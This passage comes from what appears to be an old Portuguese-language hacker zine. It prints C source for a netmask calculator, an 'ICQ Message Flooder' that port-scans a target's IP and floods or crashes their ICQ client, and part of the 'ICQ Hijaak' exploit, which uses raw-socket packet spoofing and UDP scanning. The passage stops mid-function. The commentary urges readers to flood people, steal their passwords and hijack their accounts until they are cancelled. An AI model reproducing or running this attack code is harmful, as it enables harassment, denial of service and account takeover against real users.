+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+/*
+ * Typical compilation command for Linux:
+ *	cc ipmask.c -Wall -O -m486 -N -o ipmask -s
+ */
+
+#define MYNAME "ipmask"
+
+#include <stdio.h>
+
+void Usage(void) {
+	fprintf (stderr,
+		"USAGE: %s <decimal netmask> <decimal IP address>\n",
+		MYNAME);
+}
+
+int main(int argc, char *argv[])
+{
+unsigned long netmask, ipaddr, netaddr, broadcast;
+int in[4], j;
+unsigned char bc[4],na[4];
+
+	if (3 != argc) {
+		Usage();
+		exit(1);
+	}
+
+	if (4 != sscanf(argv[1],"%d.%d.%d.%d", &in[0],&in[1],&in[2],&in[3])) {
+		fprintf (stderr,"Invalid netmask \"%s\".\n", argv[1]);
+		Usage();
+		exit(1);
+	}
+	for (j=0; j<4; ++j) {
+		if (in[j]<0 || in[j]>255) {
+			fprintf (stderr,
+				"Invalid octet %d in netmask \"%s\".\n",
+				j+1, argv[1]);
+			Usage();
+			exit(1);
+		}
+	}
+	netmask = in[3] + 256 * (in[2] + 256 * (in[1] + 256 * in[0]));
+
+	if (4 != sscanf(argv[2],"%d.%d.%d.%d", &in[0],&in[1],&in[2],&in[3])) {
+		fprintf (stderr,"Invalid IP address \"%s\".\n", argv[2]);
+		Usage();
+		exit(1);
+	}
+	for (j=0; j<4; ++j) {
+		if (in[j]<0 || in[j]>255) {
+			fprintf (stderr,
+				"Invalid octet %d in IP address \"%s\".\n",
+				j+1, argv[1]);
+			Usage();
+			exit(1);
+		}
+	}
+	ipaddr = in[3] + 256 * (in[2] + 256 * (in[1] + 256 * in[0]));
+
+	broadcast = ipaddr | (~ netmask);
+	bc[0] = broadcast / 256 / 256 / 256;
+	bc[1] = (broadcast / 256 / 256) % 256;
+	bc[2] = (broadcast / 256) % 256;
+	bc[3] = broadcast % 256;
+
+	netaddr = ipaddr & netmask;
+	na[0] = netaddr / 256 / 256 / 256;
+	na[1] = (netaddr / 256 / 256) % 256;
+	na[2] = (netaddr / 256) % 256;
+	na[3] = netaddr % 256;
+
+	printf ("%d.%d.%d.%d %d.%d.%d.%d\n",
+		bc[0], bc[1], bc[2], bc[3], na[0], na[1], na[2], na[3]);
+
+	exit(0);
+	return 0;
+}
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+        Voce aprendeu a proteger seu IP no icq. Mas proteger do que? De pro-
+gramas como esse aqui o'! E' o ICQ flooder. Ele manda quantas mensagens vc
+quiser em UIN's diferentes. O ponto fraco e' que voce tem que saber o IP do
+destino e o programa ainda fica procurando a porta do ICQ. Se o bixo proteger
+o IP como dito acima, no way, forget nigga.
+
+        Segurae o proggie...
+
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+/*
+ * ICQ Message Flooder by enkil^ and irQ
+ */
+#include <stdio.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <arpa/inet.h>
+
+/*
+ * Un Comment this if you would like to crash the other users ICQ instead
+ * Will not work on icq98, must re-compile to use.
+ */
+//#define  CRASH 16
+
+#define VER	"v1.0"
+
+#define UIN(c,b,a) ((a << 16) | (b << 8) | c)
+
+unsigned char i_header[] = {
+	0x8C,0xDD,0x33,0x00,0x02,0x00,0xEE,0x07,
+	0x00,0x00,0x8C,0xDD,0x33,0x00,0x01,0x00,
+	0x06,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+	0x82,0xD7,0xF3,0x20,0x82,0xD7,0xF3,0x20,
+	0x09,0x04,0x00,0x00,0x04,0x00,0x00,0x00,
+	0xED,0xFF,0xFF,0xFF
+};
+
+int ScanPort(char *ipaddr, int StartIP, int EndIP) {
+	struct sockaddr_in sin;
+	int sock,x,y;
+	unsigned long uin;
+	printf("Scanning Ports");
+	for (x=StartIP;x<=EndIP;++x) {
+        	if (!(sock = socket(AF_INET, SOCK_STREAM, 0))) {
+               		printf("Error: Unable to connect\n");
+			return -1;
+		}
+		sin.sin_family = AF_INET;
+        	sin.sin_addr.s_addr = inet_addr(ipaddr);
+	       	sin.sin_port = htons(x);
+	        	
+		if (connect(sock, (struct sockaddr*)&sin,sizeof(sin))!=-1) {
+			close(sock);
+			printf("Port %d Open! Flooding...\n",x);
+			fflush(stdout);
+			return x;
+		} 
+		printf(".");
+		fflush(stdout);
+	}
+	printf("\n");
+	return -1;
+}
+
+void Usage(char *EXEName) {
+	printf("* ICQ Message Flooder %s by enkil^ and irQ\n",VER);
+	printf("* Usage: %s <ip> <number of messages> <start port> <end port>\n",EXEName);
+	printf("* Arguments:\n");
+	printf("* 	<ip> - IP Address of user to flood\n");
+	printf("*	<number of messages> - Number of Messages to flood user with\n");
+	printf("*	<start port> - port to start scanning at\n");
+	printf("*	<end port> - port at which to end scanning\n");
+}
+
+void main(int argc, char *argv[]) {
+	struct sockaddr_in sin;
+	int sock,x,y;
+	unsigned long uin;
+	int Port;
+
+        if (argc < 5) {
+		Usage(argv[0]);
+		exit(1);
+ 	}
+	printf("ICQ Message Flooder %s by enkil^ and irQ\n",VER);
+	fflush(stdout);
+	srand(time());
+
+	Port = ScanPort(argv[1],atoi(argv[3]),atoi(argv[4]));
+
+	if (Port == -1) {
+		printf("No ICQ Port Found =(\n");
+		return;
+	}
+
+	printf("Flooding %s on port %d, %d times -\n",argv[1], Port, atoi(argv[2]));
+	fflush(stdout);
+	for (y=0;y<atoi(argv[2]);++y) {
+	        if (!(sock = socket(AF_INET, SOCK_STREAM, 0))) {
+        	        printf("Error: Unable to creat socket, Exiting.\n");
+			exit(1);
+		}
+		sin.sin_family = AF_INET;
+        	sin.sin_addr.s_addr = inet_addr(argv[1]);
+       		sin.sin_port = htons(Port);
+
+		for (x=0;x<3;++x) i_header[x] = i_header[x+10] = (rand() % 256);
+		for (x=0;x<6;++x) i_header[18+x] = (rand() % 256);
+#ifdef CRASH
+		i_header[CRASH]=0x07;
+#endif	        	
+		if (connect(sock, (struct sockaddr*)&sin,sizeof(sin))==-1) {
+			printf("Error Connecting to Socket\n");
+			return;
+		} 
+
+	        write(sock, "\x2E\x00", 2);
+       		write(sock, &i_header,sizeof(i_header));
+        	write(sock, "\x28\x00", 2);
+
+		uin = UIN(i_header[0],i_header[1],i_header[2]);
+
+		printf("Message Sent, UIN = %d\n",uin);
+
+		fflush(stdout);
+		close(sock);
+	}
+	printf("Done!\n");
+	exit(0);
+
+}
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+
+        Ta bom, mas qual a graca disso, icq flood, se o cara continua a usar
+o icq dele bonitinho depois e ainda por cima nao sofreu dano nenhum e nao ta
+ligando a minima pra voce.
+        Que tal voce pegar a senha do cara e ficar com a UIN dele? Legal, uh?
+Exatamente pra isso que tem esse programinha aqui, o icq hijaak. Ele faz isso
+aih que eu falei. Mas tem o porem... voce tambem precisa do ip do cara. Mas
+como pouca gente protege o ip no icq, nao e' grande problema. Para funcionar
+o dono do UIN precisa estar logado no sistema do icq(se voce nao sabe ele
+conecta num servidor e da um login). Se voce souber usar bem o icq hijaak,
+voce pode fazer tanta merda na conta do bixo que ela pode ser ate' cancelada.
+
+Ta aih o code...
+
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+/*
+ .  ICQ Hijaak
+ .  Version 1C
+ .
+ .  Author:  wumpus@innocent.com
+ .  Copyright (c) 1998 Wolvesbane
+ .
+ .  By downloading or compiling this program, you agree to the terms of this
+ .  license. If you do not agree with any of these terms you MUST delete this
+ .  program immediately from all storage areas (including browser caches).
+ .  (A) You agree not to use this program in any way that would constitute a
+ .      violate of any applicable laws.  This may included federal laws if you
+ .      live in the United States and similar laws regarding computer security
+ .      in other countries.
+ .  (B) You agree to hold the authors (referred to collective as Wolvesbane)
+ .      harmless in any damages that result due to your possession or use of
+ .      this software.
+ .  (C) Wolvesbane does not claim that this program implements any functions.
+ .      As the saying goes, "You get what you pay for." -- And you didn't pay
+ .      anything for this.
+ .  (D) This software is FREE for _NON-COMMERCIAL_ use.  You may not use this
+ .      program for any commercial use (or any other activity which makes you
+ .      money with the assistance of this program ).  The author is not
+ .      interested in commercial use of this program (and cannot think of what
+ .      commercial use would consist of ).
+ .  (E) This program was created using Linux with IP-Masquerading to run the
+ .      ICQ program unmodified and without any dissassembly.  The testing
+ .      was done with volunteers, and with a second computer logged into the
+ .      ICQ network.  No ICQ users were harmed in the creation or testing of
+ .      this program.
+ .  (F) This copyright applies only to the code written by Wolvesbane, and not
+ .      to anything included under Fair Use.
+ .  (G) Please note that if you use ANY sections of this code in your work,
+ .      (which I expressly allow as long as it is NON-COMMERCIAL), you are
+ .      obligated to give me some credit in your comments (if it is a source
+ .      file ) or in a string constant if it is a binary file.  If you do not
+ .      wish to do so, you may NOT include ANY portion of this file in your
+ .      own work.
+*/
+/*
+ * UPDATES, for May 31, 1998
+ *
+ *    I notified Mirabilis about this bug about a month ago (which from
+ *    what I recall is the semi-official delay to allow a fix ).
+ *    In that time, Mirabilis has gone from DLL 1.22 to DLL 1.26.  This
+ *    exploit has been tested again 1.26 and still works.   *ooops*!
+ *    This exploit has rather simplistic UDP scanning code... if it doesn't
+ *    work (ie, against .se hosts ), then you can't hijaak them.  Sorry, but
+ *    I just don't care enough.
+ *
+ *    Lastly, even a Windows user can get anyone's IP from ICQ by sending a
+ *    message to their UIN, and doing a netstat.
+ *
+ *    With the acquistion of Mirabilis and the ICQ protocol by AOL, I will
+ *    no longer be playing with the ICQ protocol.  Prior to that actual event
+ *    you might contact me with questions on this program.
+ */
+/*
+ . I am indebted to the author of ICQSNIFF.C, for his clear description of
+ . the ICQ protocol (although it has since changed).  And for the idea as
+ . well.
+ .
+ . Some information came from anonymous sources and Usenet postings which
+ . I didn't jot down the author.  I apologize to any author who sees his/her
+ . ideas in here.  None of this code was "stolen".
+ .
+*/
+/* To quote Arik:
+
+   Arik Vardi (arik@ICQ.COM)
+   Mon, 15 Dec 1997 13:55:16 -0500
+
+   Thanks for the vote of confidence.
+   Actualy, we don't publish the protocol since it's a work in progress
+   and
+   we still have pretty major changes from version to version.
+   Password encryption will be addressed in the next client release,
+   spoofing client messages has already been addressed in our new version
+   - ICQ98a, (which is not what you are using) and should not be possible
+   once we phase out older clients (hopfuly by the end of this month).
+   We apreciate your pointing out vulnrabilities to us and will do our
+   best
+   to fix them in future releases.
+*/
+/*
+ . Guess what, Arik.  You *lied* about fixing spoofing -- and this proves it.
+*/
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <stdarg.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>        
+#include <sys/time.h>
+#include <sys/types.h>
+#include <unistd.h>
+int MultiResolve( char * hostname,
+                int * addr_count,
+                struct in_addr ** addresses );
+enum { FAILURE = -1, SUCCESS = 0 };
+typedef unsigned short int      u16;
+typedef unsigned long int       u32;
+typedef unsigned char           u8;
+#define byte(v,o) (*((u8 *)(&(v))+(o)))
+#define word(v,o) (*((u16 *)((unsigned char *)(&(v))+(o)) ))
+#define dword(v,o) (*((u32 *)((unsigned char *)(&(v))+(o)) ))
+unsigned char icq_check_data[256] = {
+        0x0a, 0x5b, 0x31, 0x5d, 0x20, 0x59, 0x6f, 0x75,
+        0x20, 0x63, 0x61, 0x6e, 0x20, 0x6d, 0x6f, 0x64,
+        0x69, 0x66, 0x79, 0x20, 0x74, 0x68, 0x65, 0x20,
+        0x73, 0x6f, 0x75, 0x6e, 0x64, 0x73, 0x20, 0x49,
+        0x43, 0x51, 0x20, 0x6d, 0x61, 0x6b, 0x65, 0x73,
+        0x2e, 0x20, 0x4a, 0x75, 0x73, 0x74, 0x20, 0x73,
+        0x65, 0x6c, 0x65, 0x63, 0x74, 0x20, 0x22, 0x53,
+        0x6f, 0x75, 0x6e, 0x64, 0x73, 0x22, 0x20, 0x66,
+        0x72, 0x6f, 0x6d, 0x20, 0x74, 0x68, 0x65, 0x20,
+        0x22, 0x70, 0x72, 0x65, 0x66, 0x65, 0x72, 0x65,
+        0x6e, 0x63, 0x65, 0x73, 0x2f, 0x6d, 0x69, 0x73,
+        0x63, 0x22, 0x20, 0x69, 0x6e, 0x20, 0x49, 0x43,
+        0x51, 0x20, 0x6f, 0x72, 0x20, 0x66, 0x72, 0x6f,
+        0x6d, 0x20, 0x74, 0x68, 0x65, 0x20, 0x22, 0x53,
+        0x6f, 0x75, 0x6e, 0x64, 0x73, 0x22, 0x20, 0x69,
+        0x6e, 0x20, 0x74, 0x68, 0x65, 0x20, 0x63, 0x6f,
+        0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x20, 0x70, 0x61,
+        0x6e, 0x65, 0x6c, 0x2e, 0x20, 0x43, 0x72, 0x65,
+        0x64, 0x69, 0x74, 0x3a, 0x20, 0x45, 0x72, 0x61,
+        0x6e, 0x0a, 0x5b, 0x32, 0x5d, 0x20, 0x43, 0x61,
+        0x6e, 0x27, 0x74, 0x20, 0x72, 0x65, 0x6d, 0x65,
+        0x6d, 0x62, 0x65, 0x72, 0x20, 0x77, 0x68, 0x61,
+        0x74, 0x20, 0x77, 0x61, 0x73, 0x20, 0x73, 0x61,
+        0x69, 0x64, 0x3f, 0x20, 0x20, 0x44, 0x6f, 0x75,
+        0x62, 0x6c, 0x65, 0x2d, 0x63, 0x6c, 0x69, 0x63,
+        0x6b, 0x20, 0x6f, 0x6e, 0x20, 0x61, 0x20, 0x75,
+        0x73, 0x65, 0x72, 0x20, 0x74, 0x6f, 0x20, 0x67,
+        0x65, 0x74, 0x20, 0x61, 0x20, 0x64, 0x69, 0x61,
+        0x6c, 0x6f, 0x67, 0x20, 0x6f, 0x66, 0x20, 0x61,
+        0x6c, 0x6c, 0x20, 0x6d, 0x65, 0x73, 0x73, 0x61,
+        0x67, 0x65, 0x73, 0x20, 0x73, 0x65, 0x6e, 0x74,
+        0x20, 0x69, 0x6e, 0x63, 0x6f, 0x6d, 0x69, 0x6e };
+#define MAX_NUM_ADDRESSES     255
+int Resolve( char * hostname, struct in_addr * addr ) {
+        struct hostent * hinfo;
+        (void)memset( (void *)addr, 0, sizeof( struct in_addr ));
+        if ( inet_aton( hostname, addr) ) return SUCCESS;
+        if ( !(hinfo = gethostbyname( hostname ) ) ) return FAILURE;
+        (void)memcpy( (void *)addr, (void *)hinfo->h_addr,
+                sizeof(struct in_addr )); return SUCCESS; }
+int MultiResolve( char * hostname, int * addr_count,
+        struct in_addr ** addresses ) {
+        int                     host_count;
+        int                     i;
+        char                    * p;
+        struct  in_addr         address;
+        struct  hostent         * hinfo;
+        if ( inet_aton( hostname, &address ) ) {
+                p = (char *)malloc(sizeof(address));
+                if ( !p ) {
+                        fprintf(stderr,"MultiResolve: Allocation failed!\n");
+                        return FAILURE;
+                }
+                (void)memcpy((void *)p,(void *)&address, sizeof(address) );
+                *addr_count = 1;
+                *addresses = (struct in_addr *)p; return SUCCESS; }
+        if ( !(hinfo = gethostbyname(hostname) ) ) return FAILURE;
+        if ( hinfo->h_length != sizeof( struct in_addr ) ) {
+                fprintf(stderr,"MultiResolve:  h_length (%d) not equal "\
+                        "to size of struct inaddr (%d) ",
+                        hinfo->h_length, sizeof(struct in_addr) );
+                return FAILURE;
+        }
+        host_count = 0;
+        for (i = 0; i < MAX_NUM_ADDRESSES; i++ ) {
+                struct in_addr  * addr_ptr;
+                addr_ptr = (struct in_addr *)hinfo->h_addr_list[i];
+                if ( !addr_ptr )
+                        break;
+                host_count++;
+        }
+        p = (char *)malloc( host_count * hinfo->h_length );
+        if ( !p ) {
+                fprintf(stderr,"MultiResolve: Failed to allocate %d bytes\n",
+                        host_count * hinfo->h_length );
+                return FAILURE;
+                }
+        *addresses = (struct in_addr *)p;
+        for ( i = 0; i < host_count; i++ ) {
+                (void)memcpy( (void *)p,(void *)hinfo->h_addr_list[i],
+                        hinfo->h_length ); p += hinfo->h_length; }
+        *addr_count = host_count; return SUCCESS; }
+#define IP_VERS         0
+#define IP_TOS          1
+#define IP_TOTLEN       2
+#define IP_ID           4
+#define IP_FLAGS        6
+#define IP_TIMETOLIVE   8
+#define IP_PROTOCOL     9
+#define IP_CHECKSUM     10
+#define IP_SRC          12
+#define IP_DST          16
+#define IP_END          20
+#define UDP_SOURCE      0
+#define UDP_DEST        2
+#define UDP_LENGTH      4
+#define UDP_CHECKSUM    6
+#define UDP_END         8
+#define UCHDR_SOURCE    0
+#define UCHDR_DEST      4
+#define UCHDR_PROTOCOL  9
+#define UCHDR_UDPLEN    10
+#define UCHDR_END       12
+#define ICMP_TYPE       0
+#define ICMP_CODE       1
+#define ICMP_CHECKSUM   2
+#define ICMP_END        4
+u16 cksum( u16 * buf, int numWords ) {
+        u32 sum;
+        sum = 0; while ( numWords -- ) { sum += *(buf++); }
+        sum = ( sum >> 16) + ( sum & 0xffff ); sum += ( sum >> 16 );
+        return ~sum ; }
+
+
+void make_ip_hdr(       u8      * packet, int     length, u8      protocol,
+         u16     id, u16     flags, struct in_addr  me,
+                struct in_addr  you, u8      ttl ) {
+        memset( packet, 0, IP_END );
+        byte(*packet, IP_VERS ) = 0x45;
+        word(*packet, IP_TOTLEN ) = htons( length );
+        byte(*packet, IP_TIMETOLIVE ) = ttl;
+        byte(*packet, IP_PROTOCOL ) = protocol;
+        word(*packet, IP_ID ) = htons( id );
+        word(*packet, IP_FLAGS ) = htons( flags );
+        dword(*packet,IP_SRC ) = *((u32 *)&me);
+        dword(*packet,IP_DST ) = *((u32 *)&you);
+        word(*packet, IP_CHECKSUM ) = cksum( (u16 *)packet, IP_END/2 ); }
+void make_udp_hdr(      u8      * packet, int     udplength, u16     sport,
+                        u16     dport ) {
+        u8      * udp;
+        static  u8      chdr[UCHDR_END];
+        u32     pchecksum;
+
+        memset( chdr, 0, UCHDR_END );
+
+        udp = packet + ( ( byte(*packet, IP_VERS ) & 0x0F ) * 4 );
+        memset( udp, 0, UDP_END );
+        word(*udp, UDP_SOURCE ) = htons( sport );
+        word(*udp, UDP_DEST ) = htons( dport );
+        word(*udp, UDP_LENGTH ) = htons( udplength );
+        memcpy( chdr + UCHDR_SOURCE, packet + IP_SRC, 8 );
+        byte( *chdr, UCHDR_PROTOCOL ) = byte( *packet, IP_PROTOCOL );
+        word( *chdr, UCHDR_UDPLEN ) = word( *udp, UDP_LENGTH );
+        pchecksum = ( ~cksum( (u16 *)&chdr, UCHDR_END / 2 ) ) & 0xFFFF;
+        if ( udplength & 1 ) { byte( *udp, udplength + 1 ) = 0; }
+        pchecksum += ( ~cksum((u16 *)udp, udplength/ 2
+        + (udplength&1)) ) & 0xFFFF; pchecksum    += ( pchecksum >> 16 );
+        word( *udp, UDP_CHECKSUM ) = (u16)~pchecksum ; }
+int CreateRawSocket( void )
+{
+        int     s;
+        int     option;
+
+        s = socket( AF_INET, SOCK_RAW, IPPROTO_RAW );
+        if ( s < 0 ) { perror("Socket:"); exit(-1); }
+        option = 1;
+        if ( setsockopt( s, IPPROTO_IP, IP_HDRINCL,
+                        (char *)&option,  sizeof( option ) ) < 0 ) {
+                perror("Setting IP_HDRINCL"); exit(0); }
+        return s; }
+int GetLocalAddress( struct in_addr remote, struct in_addr * local )
+{
+        struct sockaddr_in      laddress;
+        struct sockaddr         * laddr = (struct sockaddr *)&laddress;
+        struct sockaddr_in      raddress;
+        struct sockaddr         * raddr = (struct sockaddr *)&raddress;
+        int     s;
+        int     err;
+        int     len;
+
+        s = socket( AF_INET, SOCK_DGRAM, IPPROTO_UDP );
+        if ( s < 1 ) {
+                return FAILURE;
+        }
+        raddress.sin_port = htons( 1984 ); 
+        raddress.sin_family = AF_INET;
+        raddress.sin_addr = remote;
+
+        err = connect(s, raddr, sizeof(raddress ));
+        if ( err < 0 ) {
+                return FAILURE;
+        }
+        len = sizeof(laddress);
+        err = getsockname(s, laddr, &len );
+        if ( err < 0 ) {
+                return FAILURE;
+        }
+        *local = laddress.sin_addr;
+        close(s);
+        return SUCCESS;
+}
+int CreateICMPSocket( void )
+{
+        int s;
+
+        s = socket( AF_INET, SOCK_RAW, IPPROTO_ICMP );
+        if ( s < 1 )
+                return FAILURE;
+        return s;
+}
+int  SendUDP( int s, struct in_addr source, struct in_addr dest,
+                u16 sport, u16 tport )
+{
+        static u8       packet[576];
+        struct sockaddr_in      raddress;
+        struct sockaddr         * raddr = (struct sockaddr *)&raddress;
+        int     psize;
+        int     err;
+
+
+        raddress.sin_port = htons( 1984 ); 
+        raddress.sin_family = AF_INET;
+        raddress.sin_addr = dest;
+
+
+        psize = IP_END + UDP_END + 6;
+
+        make_ip_hdr( packet, psize, IPPROTO_UDP, 0x666, 0,
+                source, dest, 0x7F );
+
+        make_udp_hdr( packet, psize - IP_END, sport, tport);
+
+        err = sendto( s, packet, psize, 0,raddr, sizeof(raddress));
+        if ( err != psize ) {
+                perror("Sending");
+                return FAILURE;
+                }
+        return SUCCESS;
+}
+const int       verify_secs = 2;
+int VerifyUDPPort( struct in_addr addr, u16 port )
+{
+        int             s_icmp;
+        struct timeval  start_time, end_time, wait_time;
+        fd_set          rdfs;
+        int             err;
+        static u8       packet[1500]; 
+        struct sockaddr junkaddr;
+        int             junksize;
+
+        u8              * icmphdr;
+        u8              * fiphdr;
+        u8              * fudphdr;
+        int             len;
+        int             got_unreach;
+        struct in_addr  localaddr;
+        int             rawsock;
+        if ( GetLocalAddress(addr, &localaddr) == FAILURE ) {
+         perror("GetLocalAddress"); exit(-1); }
+        s_icmp = CreateICMPSocket();
+        if ( s_icmp == FAILURE )  { perror("Getting ICMP socket"); exit(-1); }
+        rawsock = CreateRawSocket();
+        if ( rawsock < 0 ) { perror("Getting Raw socket"); exit(-1); }
+        FD_ZERO( &rdfs ); FD_SET( s_icmp, &rdfs );
+        if ( SendUDP(rawsock, localaddr, addr, 0x1984, port ) == FAILURE ) {
+                perror("Sending UDP packet"); exit(-1); }
+        got_unreach = 0; gettimeofday( &start_time, NULL );
+        do { wait_time.tv_usec = 0; wait_time.tv_sec = verify_secs;
+                err = select( s_icmp+1, &rdfs, NULL, NULL, &wait_time );
+                if ( -1 == err ) { perror("VerifyUDPPort - Select"); exit(-1); }
+                if ( !err ) break;
+                junksize = sizeof( struct sockaddr );
+                err = recvfrom( s_icmp, packet, 1500, 0,
+                        &junkaddr, &junksize );
+                if ( -1 == err ) { perror("VerifyUDPPort - recvfrom: ");
+                        exit(-1); }
+                if ( (byte(*packet,IP_PROTOCOL ) != IPPROTO_ICMP ) ||
+                   (dword(*packet, IP_SRC ) != *((u32 *)&addr) )  )
+                        goto check_timeout;
+                len =  ( byte(*packet, 0 ) & 0x0F ) * 4;
+                icmphdr = packet + len;
+                if ( (byte(*icmphdr,ICMP_TYPE ) != 3 ) ||
+                   (byte(*icmphdr,ICMP_CODE ) != 3 )  )
+                        goto check_timeout;
+                fiphdr = icmphdr + ICMP_END + 4
+                len = ( byte(*fiphdr, 0 ) & 0x0F ) * 4;
+                if ( (byte(*fiphdr,IP_PROTOCOL ) != IPPROTO_UDP ) ||
+                   ( (dword(*fiphdr, IP_DST ) != *((u32 *)&addr)  ) )   )
+                        goto check_timeout;
+                fudphdr = fiphdr + len;
+                if ( word(*fudphdr, UDP_DEST ) == htons( port ) ) {
+                         got_unreach = 1; break; }
+check_timeout:
+               gettimeofday( &end_time, NULL );
+        } while ( ( end_time.tv_sec - start_time.tv_sec ) < verify_secs );
+        close( s_icmp ); close( rawsock);
+        if ( got_unreach ) return FAILURE;
+ else return SUCCESS;
+
+}
+typedef struct  foobar
+{
+        int     next;
+        int     prev;
+        u16     rem_port;
+        int     times;
+} port_info;
+#define MAX_BURST       128
+#define UNUSED_HEAD     MAX_BURST + 1
+#define UNUSED_TAIL     MAX_BURST + 2
+#define LIVE_HEAD       MAX_BURST + 3
+#define LIVE_TAIL       MAX_BURST + 4
+#define FIRST_LPORT     55000
+#define SEND_COUNT      3
+#define NEXT(i) List[(i)].next
+#define PREV(i) List[(i)].prev
+#define PORT(i) List[(i)].rem_port
+#define TIMES(i) List[(i)].times
+int UDPScan( struct in_addr addr, u16 start, u16 end, u16 * tport )
+{
+        int     unused_head;
+        int     unused_tail;
+        int     live_head;
+        int     live_tail;
+        int     i;
+        port_info       List[ LIVE_TAIL + 1 ];
+        int     Current[ MAX_BURST ];
+        int     cur_min, cur_max;
+        int     now_port;
+        int     delay;
+        int     my_port;
+        int     cur_send;
+        struct timeval  wait_time;
+        fd_set          rdfs;
+        int     err;
+        int     s_icmp, rawsock;
+        struct in_addr  localaddr;
+        *tport = 0;
+        if ( GetLocalAddress(addr, &localaddr) == FAILURE ) {
+                perror("GetLocalAddress"); return FAILURE; }
+        s_icmp = CreateICMPSocket();
+        if ( s_icmp == FAILURE )  {
+                perror("Getting ICMP socket"); return FAILURE; }
+        rawsock = CreateRawSocket();
+        if ( rawsock < 0 ) {
+                perror("Getting Raw socket"); return FAILURE; }
+        FD_ZERO( &rdfs );
+        FD_SET( s_icmp, &rdfs );
+        List[ LIVE_TAIL ].next = -1; List[ LIVE_TAIL ].prev = LIVE_HEAD;
+        List[ LIVE_TAIL ].rem_port = 0; List[ LIVE_HEAD ].prev = -1;
+        List[ LIVE_HEAD ].next = LIVE_TAIL; List[ LIVE_HEAD ].rem_port = 0;
+        List[ UNUSED_TAIL ].next = -1; List[ UNUSED_TAIL ].prev = UNUSED_HEAD;
+        List[ UNUSED_TAIL ].rem_port = 0; List[ UNUSED_HEAD ].prev = -1;
+        List[ UNUSED_HEAD ].next = UNUSED_TAIL;
+        List[ UNUSED_HEAD ].rem_port = 0;
+        for ( i = 0; i < MAX_BURST ; i++ ) {
+                PREV( i ) = PREV( UNUSED_TAIL ); NEXT( i ) = UNUSED_TAIL;
+                 NEXT( PREV( i ) ) = i; PREV( NEXT( i ) ) = i; PORT( i ) = 0;
+                TIMES( i ) = SEND_COUNT; }
+        now_port = start;
+        cur_min = now_port;
+        cur_max = MAX_BURST;
+        my_port = FIRST_LPORT;
+        cur_send = 16;
+
+        while ( 1 ) {
+                int     cur;
+                int     cnt;
+
+                cur_max = cur_send;
+                cur_min = now_port;
+                cur = List[ LIVE_HEAD ].next;
+                cnt = 0;
+                while ( NEXT(cur) != -1 ) {
+
+                        if (!cur_max ) {
+                                break;
+                        }
+                        cnt++;
+
+                        if ( SendUDP(rawsock, localaddr, addr,
+                                my_port, PORT(cur) ) == FAILURE ) {
+                                perror("Sending UDP packet");
+                                return FAILURE;
+                        }
+                        cur_max--;
+                        TIMES(cur)--;
+                        cur = NEXT(cur);
+
+                        if ( NEXT(cur) > LIVE_TAIL ) {
+                                printf("Ugh! %d \n", NEXT(cur) );
+                                exit(-1);
+                        }
+
+                }
+
+                for ( i = 0; i < cur_max ; i ++ ) {
+                        int node;
+
+                        if ( cur_min > end )
+                                break;
+
+                        node = NEXT( UNUSED_HEAD );
+                        if ( -1 == NEXT( node ) )
+                                break;
+                        NEXT( UNUSED_HEAD ) = NEXT( node );
+                        PREV( NEXT(node) ) = UNUSED_HEAD;
+
+                        PREV( node ) = PREV( LIVE_TAIL );
+                        NEXT( node ) = LIVE_TAIL;
+                        NEXT( PREV( node ) ) = node;
+                        PREV( NEXT( node ) ) = node;
+
+                        PORT( node ) = cur_min + i;
+                        if ( SendUDP(rawsock, localaddr, addr,
+                                my_port, cur_min+i ) == FAILURE ) {
+                                perror("Sending UDP packet");
+                                return FAILURE;
+                        }
+
+                        Current[ i ] = node;
+                }
+
+                if ( ( now_port >= end ) &&
+                     ( !cnt ) ) {
+                        printf("Found nothing!\n");
+                        return SUCCESS;
+                }
+                now_port += cur_max;
+
+                cnt = 0;
+                while ( 1 ) {
+                        int junksize;
+                        static struct sockaddr  junkaddr;
+                        static u8 packet[1500];
+                        int     len;
+                        u8      * icmphdr, * fiphdr, *fudphdr;
+                        int     got_port;
+                        int     cur;
+
+                        wait_time.tv_usec = 0;
+                        wait_time.tv_sec = 5;
+                        FD_SET( s_icmp, &rdfs );
+                        err = select( s_icmp+1, &rdfs, NULL, NULL, &wait_time );                        if ( -1 == err ) {
+                                perror("UDPSCAN - Select");
+                                return FAILURE;
+                        }
+                        if ( !err )  {
+                                break;
+                        }
+                        junksize = sizeof( struct sockaddr );
+                        err = recvfrom( s_icmp, packet, sizeof(packet), 0,
+                                &junkaddr, &junksize );
+                        if ( -1 == err ) {
+                                perror("UDPSCAN - recvfrom: ");
+                                exit(-1);
+                        }
+                        if ( (byte(*packet,IP_PROTOCOL ) != IPPROTO_ICMP ) ||
+                                (dword(*packet, IP_SRC ) != *((u32 *)&addr) ) )
+                                continue;
+                        len =  ( byte(*packet, 0 ) & 0x0F ) * 4;
+                        icmphdr = packet + len;
+                        if ( (byte(*icmphdr,ICMP_TYPE ) != 3 ) ||
+                                (byte(*icmphdr,ICMP_CODE ) != 3 )  )
+                                continue;
+                        fiphdr = icmphdr + ICMP_END + 4
+                        len = ( byte(*fiphdr, 0 ) & 0x0F ) * 4;
+                        if ( (byte(*fiphdr,IP_PROTOCOL ) != IPPROTO_UDP ) ||
+                                ( (dword(*fiphdr, IP_DST ) !=
+                                *((u32 *)&addr)  ) )   )
+                                continue;
+                        fudphdr = fiphdr + len;
+                        got_port = ntohs( word(*fudphdr, UDP_DEST ) ) ;
+
+                        if ( ( got_port >= cur_min ) &&
+                                ( got_port < (cur_min+cur_max) ) ) {
+                                cur = Current[ got_port - cur_min ];
+
+                                PREV( NEXT(cur)  ) = PREV( cur );
+                                NEXT( PREV(cur) ) = NEXT( cur );
+
+                                PREV( cur ) = PREV( UNUSED_TAIL );
+                                NEXT( cur ) = UNUSED_TAIL;
